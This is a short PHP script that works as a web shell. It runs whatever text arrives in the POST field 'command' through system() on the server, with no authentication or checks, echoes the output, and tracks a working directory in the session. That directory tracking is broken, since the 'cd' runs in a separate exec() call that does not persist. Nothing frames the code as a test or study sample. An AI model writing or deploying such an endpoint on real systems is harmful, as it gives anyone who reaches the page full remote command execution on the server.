<?php
    if(!isset($_POST['command'])) {
    	die("js err");
    }
	
	session_start();
	if (isset($_SESSION['pwd'])) {
		exec("cd ".$_SESSION['pwd']);
	}
	system($_POST['command']);
	exec("pwd", $res, $ret);
	echo $res[0];
	$_SESSION['pwd'] = $res[0];
?>